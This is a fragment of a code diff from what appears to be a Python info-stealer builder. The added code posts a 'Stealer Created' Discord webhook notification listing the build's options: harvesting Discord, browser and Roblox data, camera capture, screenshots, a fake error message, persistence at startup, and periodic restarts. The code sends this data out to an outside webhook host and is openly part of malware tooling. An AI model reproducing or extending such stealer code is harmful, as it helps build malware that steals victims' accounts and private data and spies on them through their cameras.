    pass
+
+def send_webhook(embed_content):
+    payload = {
+    'embeds': [embed],
+    'username': username_webhook,
+    'avatar_url': avatar_webhook
+    }
+
+    headers = {
+    'Content-Type': 'application/json'
+    }
+
+    requests.post(webhook, data=json.dumps(payload), headers=headers)
+
+fields = [
+    {"name": f"File Name:", "value": f"""```{name_file}```""", "inline": True},
+    {"name": f"File Type:", "value": f"""```{exe_or_not}```""", "inline": True},
+    {"name": f"System:", "value": f"""```{add_system}```""", "inline": True},
+    {"name": f"Discord:", "value": f"""```{add_discord}```""", "inline": True},
+    {"name": f"Browser:", "value": f"""```{add_browser}```""", "inline": True},
+    {"name": f"Roblox:", "value": f"""```{add_roblox}```""", "inline": True},
+    {"name": f"Camera Capture:", "value": f"""```{add_cameracapture}```""", "inline": True},
+    {"name": f"Screenshot:", "value": f"""```{add_screenshot}```""", "inline": True},
+    {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
+    {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
+    {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
+    {"name": f"Webhook:", "value": f"""{webhook}""", "inline": False},
+]
+
+embed = {
+    'title': f'Stealer Created:',
+    'color': color_webhook,
+    "fields": fields,
+    'footer': {
+        "text": username_webhook,
+        "icon_url": avatar_webhook,
+        }
+    }
+send_webhook(embed)
 
 Continue()
 Reset()
